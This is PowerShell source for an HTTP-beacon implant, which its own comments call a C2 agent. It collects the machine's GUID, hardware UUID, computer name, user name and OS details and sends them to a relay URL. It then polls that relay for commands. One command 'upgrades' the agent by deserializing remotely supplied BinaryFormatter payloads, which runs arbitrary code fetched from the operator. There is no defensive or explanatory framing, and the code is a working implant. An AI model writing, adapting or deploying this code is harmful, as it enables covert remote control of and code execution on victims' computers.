# powershell-agent — the PowerShell HTTP-beacon agent core (the jscript-agent's CLR-native
# twin). One top-level symbol ONLY: the host master embeds this text verbatim, then calls
# Invoke-Agent. Nested functions read the enclosing scope's state via dynamic scoping and
# write it through $script: prefixes (functions can't assign the enclosing scope's plain
# vars) — the same pattern the C2 persistence loader uses.
function Invoke-Agent {
    # log() = relay ship ONLY (zero local echo — no Write-Host, no console). Every line is
    # POSTed with X-Log-Only: 1: the relay answers immediately (no long-poll hold) and
    # broadcasts an agent_log event to the operator's events feed. NEVER fatal — a failed
    # ship is swallowed in silence — and the in-ship guard keeps a failing relay from
    # recursing. Body = one frame holding the UTF-8 line. Each call is one synchronous
    # round-trip that stalls the agent loop — keep log() calls to milestones, never inside
    # tight loops.
    function ReadEnv($name) { [Environment]::GetEnvironmentVariable($name, 'Process') }
    function U32Bytes([uint32]$n) { [BitConverter]::GetBytes([uint32]$n) }
    function ConcatBytes([byte[]]$a, [byte[]]$b) {
        $out = New-Object byte[] ([int]($a.Length + $b.Length))
        [Array]::Copy($a, $out, $a.Length)
        [Array]::Copy($b, 0, $out, $a.Length, $b.Length)
        return ,$out
    }
    function Log($line) { PostLog $line }
    function PostLog($line) {
        if ($script:inShip -or -not $script:beaconUrl -or -not $script:identityHeaders) { return }
        $script:inShip = $true
        try {
            $req = NewPostRequest 15000
            try { $req.Headers.Add('X-Log-Only', '1') } catch {}
            $body = BuildBody (,([Text.Encoding]::UTF8.GetBytes($line)))
            $req.ContentLength = $body.Length
            $rs = $req.GetRequestStream()
            if ($body.Length -gt 0) { $rs.Write($body, 0, $body.Length) }
            $rs.Close()
            try { $req.GetResponse().Close() } catch {}
        } catch {
        } finally { $script:inShip = $false }
    }
    # ── v3 beacon framing (RAW BINARY bodies) ───────────────────────
    # The body is a stream of [u32le length][bytes] frames; one POST carries every response
    # owed since the last one, and the answer carries every queued command (same contract as
    # the JScript and C# agents — no encoding negotiation). PowerShell has a native byte[]
    # and BinaryWriter, so the JScript ADODB/cp1252 COM bridge is unnecessary here: frames
    # are built in a MemoryStream and the answer is read straight into bytes.
    function BuildBody($frames) {
        $ms = New-Object IO.MemoryStream
        $bw = New-Object IO.BinaryWriter($ms)
        foreach ($f in $frames) {
            $bw.Write([uint32]$f.Length)
            $bw.Write($f)
        }
        $bw.Flush()
        return ,$ms.ToArray()
    }
    function ParseFrames([byte[]]$bytes) {
        $frames = @()
        $i = 0
        while ($i + 4 -le $bytes.Length) {
            $len = [BitConverter]::ToUInt32($bytes, $i)
            $i += 4
            $count = [int]$len
            if ($i + $count -gt $bytes.Length) { $count = $bytes.Length - $i }
            $frame = New-Object byte[] $count
            [Array]::Copy($bytes, $i, $frame, 0, $count)
            $frames += ,$frame
            $i += [int]$len
        }
        return ,$frames
    }
    function ReadAllBytes($stream) {
        $ms = New-Object IO.MemoryStream
        $buf = New-Object byte[] 8192
        $n = $stream.Read($buf, 0, $buf.Length)
        while ($n -gt 0) {
            $ms.Write($buf, 0, $n)
            $n = $stream.Read($buf, 0, $buf.Length)
        }
        return ,$ms.ToArray()
    }
    # One POST request to the beacon endpoint: HttpWebRequest with the full identity header
    # set. Direct connection (Proxy = null) mirrors the JScript agent's setProxy(1,'','').
    # The JScript setTimeouts(10s,10s,15s,45s) split doesn't map onto HttpWebRequest's two
    # knobs: Timeout covers resolve+connect+send+the long-poll wait for the first answer
    # byte (so it carries the 45s receive budget), ReadWriteTimeout caps each stream
    # read/write at the send/receive figures.
    function NewPostRequest([int]$timeoutMs) {
        $req = [Net.HttpWebRequest][Net.WebRequest]::Create($script:beaconUrl)
        $req.Method = 'POST'
        $req.ContentType = 'application/octet-stream'
        $req.Timeout = $timeoutMs
        $req.ReadWriteTimeout = 15000
        try { $req.Proxy = $null } catch {}
        foreach ($h in $script:identityHeaders) {
            try { $req.Headers.Add($h[0], $h[1]) } catch {}
        }
        # Confirm the applied sleep so the relay extends sweep patience for THIS agent
        # only (hint-blind agents keep the base offline timers).
        if ($script:localSleepSec -gt 0) {
            try { $req.Headers.Add('X-Client-Sleep', [string]$script:localSleepSec) } catch {}
        }
        return $req
    }
    function B64Stream($base64) {
        $raw = [Convert]::FromBase64String($base64)
        $ms = New-Object IO.MemoryStream
        $ms.Write($raw, 0, $raw.Length)
        $ms.Position = 0
        return $ms
    }
    $GuidRe = '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'
    function LoadGuid {
        $guid = ''
        # 32-bit Windows PowerShell on a 64-bit OS gets HKLM\SOFTWARE redirected to
        # Wow6432Node (where MachineGuid doesn't exist) — the WMI StdRegProv fallback reads
        # the 64-bit view and is what actually saves that case.
        try {
            $v = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -Name MachineGuid -ErrorAction Stop).MachineGuid
            $guid = ('' + $v).ToLower()
        } catch {}
        if ($guid -notmatch $GuidRe) {
            try {
                $rk = [wmiclass]'\\.\root\default:StdRegProv'
                $r = $rk.GetStringValue(2147483650, 'SOFTWARE\Microsoft\Cryptography', 'MachineGuid')
                if ($r.ReturnValue -eq 0) { $guid = ('' + $r.sValue).ToLower() }
            } catch {}
        }
        if ($guid -notmatch $GuidRe) {
            # Fall back to the SMBIOS hardware UUID; stable across OS reinstalls.
            try {
                foreach ($cs in (Get-WmiObject Win32_ComputerSystemProduct)) {
                    $u = ('' + $cs.UUID).ToLower()
                    if ($u -match $GuidRe) { $guid = $u }
                }
            } catch {}
        }
        return $guid
    }
    function BuildIdentity {
        $guid = LoadGuid
        $archMap = @{ AMD64 = 'x86_64'; x86 = 'i386'; ARM64 = 'aarch64' }
        $archFromEnv = ReadEnv 'PROCESSOR_ARCHITEW6432'
        if (-not $archFromEnv) { $archFromEnv = ReadEnv 'PROCESSOR_ARCHITECTURE' }
        $arch = $archMap[$archFromEnv]
        if (-not $arch) { $arch = $archFromEnv }
        # Undetected values stay empty — the header is OMITTED below, never sent as ''
        # and never as a placeholder like 'unknown'.
        $processArch = '' + $archMap[(ReadEnv 'PROCESSOR_ARCHITECTURE')]
        $osVersion = ''
        $buildNumber = ''
        $cpuArchCode = ''
        try {
            foreach ($os in (Get-WmiObject Win32_OperatingSystem)) {
                $osVersion = '' + $os.Version
                $buildNumber = '' + $os.BuildNumber
            }
            foreach ($cpu in (Get-WmiObject Win32_Processor)) { $cpuArchCode = '' + $cpu.Architecture }
        } catch {}
        if ($cpuArchCode -eq '0') { $arch = 'i386' }
        elseif ($cpuArchCode -eq '9') { $arch = 'x86_64' }
        elseif ($cpuArchCode -eq '12') { $arch = 'aarch64' }
        # The same Win7 CLR-pin rule the other agents use: 6.1 (or build 7600/7601 when the
        # version didn't parse) gets the CLR-2 string for COMPLUS_Version.
        if ($osVersion -match '^(\d+)\.(\d+)') {
            if ($matches[1] -eq '6' -and $matches[2] -eq '1') { $script:clrVersion = 'v2.0.50727' }
        } elseif ($buildNumber -eq '7600' -or $buildNumber -eq '7601') {
            $script:clrVersion = 'v2.0.50727'
        }
        # REQUIRED headers carry compile-time constants. Every detection-derived field is
        # OPTIONAL — undetected values OMIT the header (never '', never a placeholder), so
        # the relay/C2 see "not reported". The machine UUID is nullable too: when every
        # fallback fails it is omitted and the relay treats the agent as identity-less.
        # There is NO Bitness header — the process arch already carries the full width,
        # and x86_64/aarch64 are both 64-bit.
        # Per-RUNTIME session key — a random GUID minted ONCE per process (BuildIdentity
        # runs a single time, before the beacon loop) and sent on every beacon, so the
        # relay/C2 can tell agent RUNTIMES apart on one machine: the machine uuid stays
        # THE identity rows are keyed by, the session key distinguishes concurrent or
        # succeeding processes (an upgrade takeover swaps it mid-session). It identifies,
        # authorizes nothing. The same contract the JScript/C# breeds ship.
        $sessionKey = [guid]::NewGuid().ToString('D')
        $pairs = @(
            @('X-Api-Version', '1'),
            @('X-Device-Id', $guid),
            @('X-Session-Id', $sessionKey),
            @('X-Device-Name', (ReadEnv 'COMPUTERNAME')),
            @('X-User-Id', (ReadEnv 'USERNAME')),
            @('X-Device-Arch', $arch),
            @('X-App-Arch', $processArch),
            @('X-Platform', 'Windows'),
            @('X-OS-Version', $osVersion),
            @('X-OS-Build', $buildNumber),
            @('X-Client-Id', '3'),
            @('X-Client-Features', '0800000000000000')
        )
        return ,@($pairs | Where-Object { "$($_[1])" -ne '' })
    }
    # Command layout: [opcode][corrId:u32le][payload...]. Every reply echoes the id after
    # its status: [status:u32le][corrId:u32le]. Id 0 = unmatched.
    function Reply([uint32]$status) { return ,(ConcatBytes (U32Bytes $status) (U32Bytes $corrId)) }
    function DispatchCommand([byte[]]$frame) {
        $corrId = 0
        if ($frame.Length -ge 5) { $corrId = [BitConverter]::ToUInt32($frame, 1) }
        if ($frame[0] -eq 10) { $script:exiting = $true; return $null }
        if ($frame[0] -eq 11) {
            try {
                # The upgrade payload is latin-1 text after the opcode (the JScript agent's
                # charCodeAt&255 semantics) — base64 bodies stay pure ASCII either way.
                $payloadText = [Text.Encoding]::GetEncoding(28591).GetString($frame, 5, $frame.Length - 5)
                $headerEnd = $payloadText.IndexOf("`n`n")
                $headerLines = @()
                $bodyText = ''
                if ($headerEnd -ge 0) {
                    $headerLines = $payloadText.Substring(0, $headerEnd) -split "`n"
                    $bodyText = $payloadText.Substring($headerEnd + 2)
                }
                $stage1Split = $bodyText.IndexOf("`n")
                $stage1B64 = ''
                $blobB64 = ''
                if ($stage1Split -ge 0) {
                    $stage1B64 = $bodyText.Substring(0, $stage1Split) -replace '\s', ''
                    $blobB64 = $bodyText.Substring($stage1Split + 1) -replace '\s', ''
                }
                try {
                    [Environment]::SetEnvironmentVariable('COMPLUS_Version', $script:clrVersion, 'Process')
                    Log ('upgrade: COMPLUS_Version=' + $script:clrVersion)
                } catch {}
                $driveMode = 0
                $entryPoint = ''
                foreach ($line in $headerLines) {
                    $l = $line.TrimEnd("`r")
                    if ($l.Length -eq 0) { continue }
                    if ($l.StartsWith('!d=')) {
                        $driveMode = 0
                        try { $driveMode = [int]$l.Substring(3) } catch {}
                    } elseif ($l.StartsWith('!e=')) {
                        $entryPoint = $l.Substring(3)
                    } else {
                        $eq = $l.IndexOf('=')
                        if ($eq -gt 0) {
                            [Environment]::SetEnvironmentVariable($l.Substring(0, $eq), $l.Substring($eq + 1), 'Process')
                            Log ('upgrade: set ' + $l)
                        }
                    }
                }
                Log ('upgrade: blob ' + $blobB64.Length + ' chars, stage1 ' + $stage1B64.Length + ' chars, drive ' + $driveMode)
                if ($stage1B64.Length -gt 0) {
                    try {
                        $fmt1 = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
                        $null = $fmt1.Deserialize((B64Stream $stage1B64))
                    } catch { Log 'upgrade: stage1 threw (expected)' }
                }
                $fmt = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
                if ($driveMode -eq 1) {
                    # The JScript arm DynamicInvoke's a one-element ArrayList holding
                    # undefined — the CLR marshals that to a null argument; the PowerShell
                    # equivalent is a single-element object[] with $null.
                    $fmt.Deserialize((B64Stream $blobB64)).DynamicInvoke([object[]]@($null)).CreateInstance($entryPoint)
                } else {
                    $null = $fmt.Deserialize((B64Stream $blobB64))
                }
                Log 'upgrade: deserialize done'
                return ,(Reply 0)
            } catch {
                Log ('upgrade failed: ' + $_.Exception.Message)
                return ,(Reply 1)
            }
        }
        Log ('command opcode ' + $frame[0] + ' unknown - replying status 2')
        return ,(Reply 2)
    }
    # ── The beacon loop ─────────────────────────────────────────────
    $script:exiting = $false
    $script:inShip = $false
    $script:identityHeaders = $null
    $script:clrVersion = 'v4.0.30319'
    # Deep-idle pacing state: the sleep the relay last hinted (X-Sleep-Hint, seconds
    # 0-600) and whether the idle transition was already logged (one log ship per idle
    # ENTRY — a ship EVERY idle cycle doubled the idle request cost).
    $script:localSleepSec = 0
    $script:idleLogged = $false
    # TLS 1.2 by int-cast (relays sit on modern TLS stacks; on .NET 3.5 the Tls12 enum
    # member doesn't exist, and a numeric assignment sidesteps the failed enum parse).
    # Process-wide ServicePointManager state — set before the first request, guarded so a
    # locked-down host can't make the agent fail before it beacons.
    try {
        $cur = [int][Net.ServicePointManager]::SecurityProtocol
        if (($cur -band 3072) -eq 0) { [Net.ServicePointManager]::SecurityProtocol = $cur -bor 3072 }
    } catch {}
    try { [Net.ServicePointManager]::Expect100Continue = $false } catch {}
    $script:beaconUrl = ReadEnv 'H_URL'
    if (-not $script:beaconUrl) { Log 'beacon endpoint not set'; return 'fail' }
    $script:identityHeaders = BuildIdentity
    Log ('PowerShell agent beaconing to ' + $script:beaconUrl + ' as ' + $script:identityHeaders[1][1])
    $pending = @()
    while (-not $script:exiting) {
        try {
            $req = NewPostRequest 45000
            if ($pending.Count -gt 0) { $body = BuildBody $pending } else { $body = New-Object byte[] 0 }
            $req.ContentLength = $body.Length
            $rs = $req.GetRequestStream()
            if ($body.Length -gt 0) { $rs.Write($body, 0, $body.Length) }
            $rs.Close()
            $resp = $req.GetResponse()
        } catch {
            return 'fail'
        }
        # Deep-idle hint (X-Sleep-Hint, seconds): how long to wait LOCALLY before the
        # next POST after an empty answer. Old relays omit it (→ 0 = immediate
        # re-POST); clamped so a bad header can never park the agent. Read BEFORE the
        # response stream closes.
        try { $script:localSleepSec = [Math]::Max(0, [Math]::Min(600, [int][string]$resp.Headers['X-Sleep-Hint'])) } catch { $script:localSleepSec = 0 }
        try { $answer = ReadAllBytes $resp.GetResponseStream() } catch { $answer = New-Object byte[] 0 } finally { $resp.Close() }
        $pending = @()
        # Empty answer = nothing queued — re-POST after the hint. The idle log ships
        # once per idle ENTRY: each Log is its own X-Log-Only POST, and one EVERY
        # cycle doubled the idle request cost.
        if ($answer.Length -eq 0) {
            if (-not $script:idleLogged) { Log 'idle - empty answer'; $script:idleLogged = $true }
            # Deep-idle pacing: wait the hint out locally — the durable pool keeps
            # commands queued; the cost is only pickup latency while deep-idle.
            if ($script:localSleepSec -gt 0) { Start-Sleep -Seconds $script:localSleepSec }
            continue
        }
        $script:idleLogged = $false
        $frames = ParseFrames $answer
        foreach ($f in $frames) {
            if ($script:exiting) { break }
            $replyBytes = DispatchCommand $f
            if ($script:exiting) { Log 'exit'; return 'exit' }
            if ($null -ne $replyBytes) { $pending += ,$replyBytes }
        }
    }
    return 'exit'
}
